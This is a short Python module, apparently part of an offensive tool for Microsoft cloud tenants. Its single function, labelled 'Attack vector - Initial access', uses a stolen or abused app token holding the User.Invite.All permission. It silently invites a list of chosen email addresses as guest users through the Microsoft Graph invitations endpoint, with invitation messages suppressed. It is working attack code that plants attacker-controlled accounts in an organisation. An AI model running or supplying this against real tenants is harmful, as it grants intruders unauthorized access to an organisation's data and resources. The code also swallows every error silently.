import requests
import colorama
from colorama import Fore, Style


def UserInvite_Vectors(request_headers, UserInviteSettings, tenantId):
    print()
    print("User.Invite.All - Allows the app to invite guest users to the organization, without a signed-in user..")
    print()
    try:
        print("Attack vector - Initial access.")

        for user in UserInviteSettings['users']:
            create_message_URL = "https://graph.microsoft.com/v1.0/invitations"
            message_obj = {
                "invitedUserEmailAddress": user,
                "inviteRedirectUrl": "https://myapplications.microsoft.com/tenantid=" + tenantId,
                "sendInvitationMessage": "false",
                "status": "Completed"

            }

            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            code = result.status_code
            if code == 201:
                print(Fore.GREEN + "invited user " + user)
                print(Style.RESET_ALL)
            else:
                print("Action did not worked.")
    except:
        pass


